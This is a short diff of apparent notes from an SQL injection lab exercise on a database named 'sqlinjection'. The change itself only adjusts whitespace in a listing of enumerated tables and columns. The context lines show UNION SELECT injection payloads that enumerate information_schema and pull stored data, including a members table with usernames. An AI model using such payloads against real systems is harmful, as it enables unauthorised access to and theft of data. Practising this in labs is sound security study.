@@ -10,8 +10,8 @@ UNION SELECT data,2,3 FROM sqlinjection.share4 <----------- DECODE FROM BASE64
 
 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE table_schema = 'sqlinjection'
 ----------------------------------------------------
-sqlinjection	categories	      id
-sqlinjection	categories	      name
+sqlinjection	categories	  id
+sqlinjection	categories	  name
 sqlinjection	categories	  description
 sqlinjection	members	          id
 sqlinjection	members	          username
